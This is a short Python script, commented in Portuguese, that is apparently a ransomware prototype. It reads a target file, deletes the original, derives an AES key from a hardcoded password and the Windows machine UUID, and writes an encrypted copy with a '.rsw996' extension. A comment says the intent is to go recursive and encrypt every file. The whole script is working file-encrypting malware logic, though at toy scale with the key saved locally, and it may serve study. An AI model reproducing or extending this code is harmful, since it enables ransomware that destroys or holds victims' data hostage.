import os
import pyaes
import subprocess
import pbkdf2

## abrir o arquivo a ser criptografado diretamente da pasta raiz, executando os .py
# Obter o diretorio atual (raiz)
dir_path = os.path.dirname(os.path.realpath(__file__))
file_name = dir_path + "\\alvo.txt"
# ideia e fazer recursivo e pegar todos os arquivos e criptografar
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
password = "996527@"+current_machine_id
passwordSalt = os.urandom(16)
key = pbkdf2.PBKDF2(password, passwordSalt).read(32)
# salva a chave de criptografia
filename_sec = "key.sec";
file_key = open(f'{filename_sec}',"wb")
file_key.write(key)
file_key.close()

# criptografa o arquivo
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".rsw996"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
